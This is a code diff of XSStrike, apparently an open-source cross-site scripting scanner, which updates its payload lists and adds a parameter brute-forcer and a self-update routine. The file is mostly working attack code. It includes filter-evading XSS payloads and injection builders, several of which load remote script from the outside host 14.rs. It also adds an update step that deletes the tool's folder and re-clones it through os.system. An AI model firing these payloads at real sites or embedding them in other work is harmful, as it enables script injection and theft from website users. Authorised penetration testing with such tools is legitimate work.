@@ -10,16 +10,7 @@ from fuzzywuzzy import fuzz # Module for fuzzy matching
 from HTMLParser import HTMLParser # For parsing HTML
 from time import sleep # To pause the program for a specific time
 import re # Module for RegEx
-
-date = '28-01-2018'
-
-br = mechanize.Browser() # Just shortening the calling function
-br.set_handle_robots(False) # Don't follow robots.txt
-br.set_handle_equiv(True) # I don't know what it does, but its some good shit
-br.set_handle_redirect(True) # Follow redirects
-br.set_handle_referer(True) # Include referrer
-br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
-('Accept-Encoding', 'deflate'), ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
+import os # Standard module for system related operations
 
 # Just some colors and shit
 white = '\033[1;97m'
@@ -32,6 +23,23 @@ que =  '\033[1;34m[?]\033[1;m'
 bad = '\033[1;31m[-]\033[1;m'
 good = '\033[1;32m[+]\033[1;m'
 run = '\033[1;97m[~]\033[1;m'
+
+br = mechanize.Browser() # Just shortening the calling function
+br.set_handle_robots(False) # Don't follow robots.txt
+br.set_handle_equiv(True) # I don't know what it does, but its some good shit
+br.set_handle_redirect(True) # Follow redirects
+br.set_handle_referer(True) # Include referrer
+br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+('Accept-Encoding', 'deflate'), ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
+
+date = '28-02-2018'
+
+def update():
+    xsstrike = br.open('https://github.com/UltimateHackers/XSStrike/blob/master/xsstrike').read()
+    if date not in xsstrike:
+        choice = raw_input('%s A new version of XSStrike is available. Would you like to update? [Y/n] ' % que).lower()
+        if choice != 'n':
+            os.system('cd .. && rm -r XSStrike && git clone https://github.com/UltimateHackers/XSStrike')
 
 xsschecker = 'd3v' # A non malicious string to check for reflections and stuff
 paranames = [] # list for storing parameter names
@@ -66,12 +74,12 @@ event_handlers = { # Event handlers and the name of tags which can be used with 
 }
 
 functions = [ # JavaScript functions to get a popup
-'[8].find(alert)', 'confirm()',
-'(alert)()', 'co\u006efir\u006d()',
+'[8].find(confirm)', 'confirm()',
+'(confirm)()', 'co\u006efir\u006d()',
 '(prompt)``', 'a=prompt,a()']
 
 # "Not so malicious" payloads for fuzzing
-fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%%00nload=yyy>', '<z oNStart=confirm()>', '<z oNMousEDown=(((alert)))()>', '<z oNMousEDown=(prompt)``>', '<EmBed sRc=//14.rs>',
+fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%00nload=yyy>', '<z oNStart=confirm()>', '<z oNMousEDown=(((confirm)))()>', '<z oNMousEDown=(prompt)``>', '<EmBed sRc=//14.rs>',
 '<EmBed sRc=\/\\14.rs>', '<z oNMoUseOver=yyy>', '<z oNMoUsedoWn=yyy>', '<z oNfoCus=yyy>', '<z oNsUbmit=yyy>', '<z oNToggLe=yyy>', '<z oNoRieNtATionChaNge=yyy>', '<z OnReaDyStateChange=yyy>',
 '<z oNbEfoReEdiTFoCus=yyy>', '<z oNDATAsEtChangeD=yyy>', '<sVG x=y>', '<bODy x=y>', '<emBed x=y>', '<aUdio x=y>', '<sCript x=y z>', '<iSinDEx x=y>',
 '<deTaiLs x=y>', '<viDeo x=y>', '<MaTh><x:link>', 'x<!--y-->z', '<test>', '<script>String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 41)</script>',
@@ -79,23 +87,34 @@ fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%%00nload=yyy>', '<z oNStart=conf
 '<bGsOund sRc=x>']
 
 payloads = [ # Payloads for blind xss and simple bruteforcing
-'\'"</Script><Html Onmouseover=(alert)(1) //'
+'\'"</Script><Html Onmouseover=(confirm)()//'
 '<imG/sRc=l oNerrOr=(prompt)() x>',
 '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
 '<deTails open oNToggle=confi\u0072m()>',
-'<A/iD=x hREf=javascript&colon;(prompt)&lpar;1&rpar; id=x>Click</A>',
 '<img sRc=l oNerrOr=(confirm)() x>',
-'<iMg sRc=x:confirm`` oNError=e\u0076al(src)>',
-'<sCript x>confirm``</script x>',
-'--><sVg/oNLoad=(confirm)()><!--',
-'<sCriPt sRc=//14.rs>',
-'<iMg sRc=x:confirm`` oNError=eval(src)>',
-'<svG oNLoad=confirm&#x28;1&#x29>',
+'<svg/x=">"/onload=confirm()//',
+'<svg%0Aonload=%09((pro\u006dpt))()//',
+'<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
+'<sCript x>confirm``</scRipt x>',
 '<Script x>prompt()</scRiPt x>',
-'\'"><y oNMousEDown=((alert))()>ClickHere!',
-'<a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>',
-'<img src=x onerror=co\u006efir\u006d`1`>',
+'<sCriPt sRc=//14.rs>',
+'<embed//sRc=//14.rs>',
+'<base href=//14.rs/><script src=/>',
+'<object//data=//14.rs>',
+'<s=" onclick=confirm``>clickme',
+'<svG oNLoad=co\u006efirm&#x28;1&#x29>',
+'\'"><y///oNMousEDown=((confirm))()>Click',
+'<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
+'<img src=x onerror=confir\u006d`1`>',
 '<svg/onload=co\u006efir\u006d`1`>']
+
+blind_params = ['redirect','redir','url','link','goto','debug','_debug','test','get','index','src','source','file',
+'frame','config','tst','new','old','var','rurl','return_to','_return','returl','last','text','load','email',
+'mail','user','username','password','pass','passwd','first_name','last_name','back','href','ref','data','input',
+'out','net','host','address','code','auth','userid','auth_token','token','error','keyword','key','q','query','aid',
+'bid','cid','did','eid','fid','gid','hid','iid','jid','kid','lid','mid','nid','oid','pid','qid','rid','sid',
+'tid','uid','vid','wid','xid','yid','zid','cal','country','x','y','topic','title','head','higher','lower','width',
+'height','add','result','log','demo','example','message']
 
 # Banner
 print'''  %s____  ___  _________ _________ __          __ __           
@@ -105,6 +124,7 @@ print'''  %s____  ___  _________ _________ __          __ __
   /___/\  \/_______  /_______  /|__|  |__|  |__|__|_ \\\\___  >
         \_/        \/        \/                     \/    \/ v2%s.%s0%s\n''' % (white,red,white,red,white, end)
 
+update()
 
 ###############
 #   Fuzzer
@@ -151,7 +171,7 @@ def fuzzer(url, param_data, GET, POST):
 def WAF_detector(url, param_data, GET, POST):
     global WAF
     WAF = False
-    noise = quote_plus('<script>alert()</script>') #a payload which is noisy enough to provoke the WAF
+    noise = quote_plus('<script>confirm()</script>') #a payload which is noisy enough to provoke the WAF
     fuzz = param_data.replace(xsschecker, noise) #Replaces xsschecker in param_data with noise
     try:
         sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
@@ -187,37 +207,42 @@ def WAF_detector(url, param_data, GET, POST):
 def filter_checker(url, param_data, GET, POST):
     strength = '' # A variable for containing strength of the filter
     # Injecting a malicious payload first by replacing xsschecker with our payload
-    low_string = param_data.replace(xsschecker, quote_plus('<svg/onload=(confirm)()>'))
-    sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
-    if GET:
-        low_request = br.open(url + low_string).read()
-    else:
-        low_request = br.open(url, low_string).read()
-    if '<svg/onload=(confirm)()>' in low_request: # If payload was reflected in response
-        print "%s Filter Strength : %sLow or None%s" % (good, green, end)
-        print '%s Payload: <svg/onload=(confirm)()>' % good
-        print '%s Efficiency: 100%%' % good
-        choice = raw_input('%s A payload with 100%% efficiency was found. Continue scanning? [y/N] ' % que).lower()
-        if choice == 'y':
-            pass
-        else:
-            quit()
-        strength = 'low' # As a malicious payload was not filtered, the filter is weak
-    else: # If malicious payload was filtered (was not in the response)
-        # Now we will use a less malicious payload
-        medium_string = param_data.replace(xsschecker, quote_plus('<zz//onxx=yy>'))
+    try:
+        low_string = param_data.replace(xsschecker, quote_plus('<svg/onload=(confirm)()>'))
         sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
         if GET:
-            medium_request = br.open(url + medium_string).read()
+            low_request = br.open(url + low_string).read()
         else:
-            medium_request = br.open(url + medium_string).read()
-        if '<zz onxx=yy>' in medium_request:
-            print '%s Filter Strength : %sMedium%s' % (info, yellow. end)
-            strength = 'medium'
-        else: #Printing high since result was not medium/low
-            print '%s Filter Strength : %sHigh%s' % (bad, red, end)
-            strength = 'high'
-        return strength
+            low_request = br.open(url, low_string).read()
+        if '<svg/onload=(confirm)()>' in low_request: # If payload was reflected in response
+            print "%s Filter Strength : %sLow or None%s" % (good, green, end)
+            print '%s Payload: <svg/onload=(confirm)()>' % good
+            print '%s Efficiency: 100%%' % good
+            choice = raw_input('%s A payload with 100%% efficiency was found. Continue scanning? [y/N] ' % que).lower()
+            if choice == 'y':
+                pass
+            else:
+                if GET:
+                    webbrowser.open(url+param_data.strip(xsschecker)+payload_to_compare)
+                    quit()
+            strength = 'low' # As a malicious payload was not filtered, the filter is weak
+        else: # If malicious payload was filtered (was not in the response)
+            # Now we will use a less malicious payload
+            medium_string = param_data.replace(xsschecker, quote_plus('<zz//onxx=yy>'))
+            sleep(delay) # Pausing the program. Default = 0 sec. In case of WAF = 6 sec.
+            if GET:
+                medium_request = br.open(url + medium_string).read()
+            else:
+                medium_request = br.open(url + medium_string).read()
+            if '<zz onxx=yy>' in medium_request:
+                print '%s Filter Strength : %sMedium%s' % (info, yellow. end)
+                strength = 'medium'
+            else: #Printing high since result was not medium/low
+                print '%s Filter Strength : %sHigh%s' % (bad, red, end)
+                strength = 'high'
+            return strength
+    except Exception as e:
+        print '%s Target doesn\'t seem to respond properly. Error Code: %s' % (bad, re.search(r'\d\d\d', str(e)).group())
 
 ##################
 #   Locater
@@ -245,7 +270,7 @@ def locater(url, param_data, GET, POST):
 def scan_occurence(init_resp):
     # Parses the response to locate the position/context of xsschecker i.e. d3v
     location = html_parse(init_resp) # Calling out the parser function
-    if location in ('script_data', 'html_data', 'start_end_tag_attr', 'attr'):
+    if location in ('script', 'html_data', 'start_end_tag_attr', 'attr'):
         occur_number.append(OCCURENCE_NUM)
         occur_location.append(location)
     # We are treating the comment context differentally because if a payload is reflected
@@ -283,17 +308,16 @@ def test_param_check(payload_to_check, payload_to_compare, OCCURENCE_NUM, url, p
             if action == 'do':
                 print '\n%s Payload: %s' % (good, payload_to_compare)
                 print '%s Efficiency: 100%%' % good
-                choice = raw_input('%s A payload with 100%% efficiency was found. Continue scanning? [y/N]' % que).lower()
+                choice = raw_input('%s A payload with 100%% efficiency was found. Continue scanning? [y/N] ' % que).lower()
                 if choice == 'y':
                     pass
                 else:
                     if GET:
                         webbrowser.open(url+param_data.strip(xsschecker)+payload_to_compare)
                         quit()
-                    else:
-                        print '%s XSStrike gets shit done.' % XSStrike
-            elif occurence_counter == OCCURENCE_NUM:
+            if occurence_counter == OCCURENCE_NUM:
                 success = True
+            break
         
         if efficiency > 90:
             if action == 'do':
@@ -305,13 +329,14 @@ def test_param_check(payload_to_check, payload_to_compare, OCCURENCE_NUM, url, p
                         location_readable = 'inside a HTML comment '
                     elif data_type == 'html_data':
                         location_readable = 'as data or plaintext on the page'
-                    elif data_type == 'script_data':
+                    elif data_type == 'script':
                         location_readable = 'as data in javascript'
                     elif data_type == 'start_end_tag_attr':
                         location_readable = 'as an attribute in an empty tag'
                     elif data_type == 'attr':
                         location_readable = 'as an attribute in an HTML tag'
                     print '%s Location: %s' % (good, location_readable)
+                    break
                 except:
                     continue
     return success
@@ -377,7 +402,7 @@ class MyHTMLParser(HTMLParser):
             if(OCCURENCE_PARSED == OCCURENCE_NUM):
                 try:
                     if(CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS)-1] == "script"):
-                        raise Exception("script_data")
+                        raise Exception("script")
                     else:
                         raise Exception("html_data")
                 except:
@@ -405,6 +430,22 @@ def which_quote(OCCURENCE_NUM, url, param_data, GET, POST):
             return quote
 
 ################
+#   ParamFinder
+################
+
+def paramfinder(url, GET, POST):
+    for param in blind_params:
+        if param not in paranames:
+            if GET:
+                response = br.open(url + '?' + param + '=' + xsschecker).read()
+            if POST:
+                response = br.open(url, param + '=' + xsschecker).read()
+            if '\'%s\'' % xsschecker in response or '"%s"' % xsschecker in response or ' %s ' % xsschecker in response:
+                print '%s Valid parameter found : %s%s%s' % (good, green, param, end)
+                paranames.append(param)
+                paravalues.append('')
+
+################
 #   Injector
 ################
 
@@ -412,7 +453,7 @@ def inject(url, param_data, GET, POST):
     special = ''
     l_filling = ''
     e_fillings = ['%0a','%09','%0d','+'] # "Things" to use between event handler and = or between function and =
-    fillings = ['%0a','%09','%0d','/+/'] # "Things" to use instead of space
+    fillings = ['%0c', '%0a','%09','%0d','/+/'] # "Things" to use instead of space
     
     for OCCURENCE_NUM, location in izip(occur_number, occur_location):
         print '\n%s Testing reflection no. %s ' % (run, OCCURENCE_NUM)
@@ -463,14 +504,17 @@ def inject(url, param_data, GET, POST):
                 for tag in tags:
                     for event_handler, compatible in event_handlers.items():
                         if tag in compatible:
-                            for filling, function, e_fillings in izip(fillings, functions, e_fillings):
+                            for filling, function, e_filling in izip(fillings, functions, e_fillings):
                                 progress = progress + 1
                                 sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                                 sys.stdout.flush()
-                                payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
+                                if event_handler == 'oNeRror':
+                                    payload = '%s<%s%s%s%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
+                                else:
+                                    payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
                                 test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
         
-        elif location == 'script_data':
+        elif location == 'script':
             print '%s Trying to break out of %sJavaScript%s context.' % (run, green, end)
             prefix_suffix = {'\'-': '-\'', '\\\'-': '-\\\'', '\\\'-': '//\''}
             progress = 0
@@ -480,7 +524,7 @@ def inject(url, param_data, GET, POST):
                     sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                     sys.stdout.flush()
                     payload = prefix + function + suffix
-                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, action='do')
+                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
             test_param_check(quote_plus('</script><svg onload=prompt()>'), '</script><svg onload=prompt()>', OCCURENCE_NUM, url. param_data, GET, POST, action='do')
         
         elif location == 'html_data':
@@ -501,7 +545,10 @@ def inject(url, param_data, GET, POST):
                             progress = progress + 1
                             sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                             sys.stdout.flush()
-                            payload = '%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
+                            if event_handler == 'oNeRror':
+                                payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, g_than)
+                            else:
+                                payload = '%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
                             test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
 
         elif location == 'start_end_tag_attr' or location == 'attr':
@@ -524,7 +571,10 @@ def inject(url, param_data, GET, POST):
                                     progress = progress + 1
                                     sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                                     sys.stdout.flush()
-                                    payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
+                                    if event_handler == 'oNeRror':
+                                        payload = '%s<%s%s%s%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
+                                    else:
+                                        payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
                                     test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
             
             elif quote not in allowed and 'entity' in allowed:
@@ -544,7 +594,10 @@ def inject(url, param_data, GET, POST):
                                     progress = progress + 1
                                     sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
                                     sys.stdout.flush()
-                                    payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
+                                    if event_handler == 'oNeRror':
+                                        payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
+                                    else:
+                                        payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
                                     test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
             else:
                 print '%s Quotes are being filtered, its not possible to break out of the context.' % bad
@@ -570,6 +623,9 @@ def param_parser(target, param_data, GET, POST):
 ##################
 
 def initiator(url, GET, POST):
+    choice = raw_input('%s Would you like to look for hidden parameters? [y/N] ' % que)
+    if choice == 'y':
+        paramfinder(url, GET, POST)
     if GET:
         GET, POST = True, False
         WAF_detector(url, '?'+paranames[0]+'='+paravalues[0], GET, POST)
@@ -598,7 +654,7 @@ def initiator(url, GET, POST):
                 else:
                     delay = 0
                 fuzzer(url, param_data, GET, POST) #Launches fuzzer aka Ninja
-            
+                quit()
             filter_checker(url, param_data, GET, POST) # Launces filter checker
             locater(url, param_data, GET, POST) # Launcher locater
             inject(url, param_data, GET, POST) # Launches injector
@@ -631,6 +687,7 @@ def initiator(url, GET, POST):
                 else:
                     delay = 0
                 fuzzer(url, param_data, GET, POST) # Launches fuzzer aka Ninja
+                quit()
             filter_checker(url, param_data, GET, POST) # Launches filter checker
             locater(url, param_data, GET, POST) # Launches locater
             inject(url, param_data, GET, POST) # Launches injector
@@ -639,10 +696,8 @@ def initiator(url, GET, POST):
             current_param = current_param + 1
     
     if len(occur_number) == 0 and GET:
-        choice = raw_input('%s Execute project HULK for blind XSS Detection? [Y/n]' % que).lower()
-        if choice == 'n':
-            quit()
-        else:
+        choice = raw_input('%s Execute project HULK for blind XSS Detection? [Y/n] ' % que).lower()
+        if choice != 'n':
             for payload in payloads:
                 param_data = param_data.replace(xsschecker, payload) # Replaces the xsschecker with payload
                 print '%s Payload: %s' % (info, payload)
@@ -650,7 +705,7 @@ def initiator(url, GET, POST):
                 next = raw_input('%s Press enter to execute next payload' % que)
     
     elif len(occur_number) == 0 and POST:
-        choice = raw_input('%s Would you like to generate some payloads for blind XSS? [Y/n]' % que).lower()
+        choice = raw_input('%s Would you like to generate some payloads for blind XSS? [Y/n] ' % que).lower()
         if choice == 'n':
             quit()
         else:
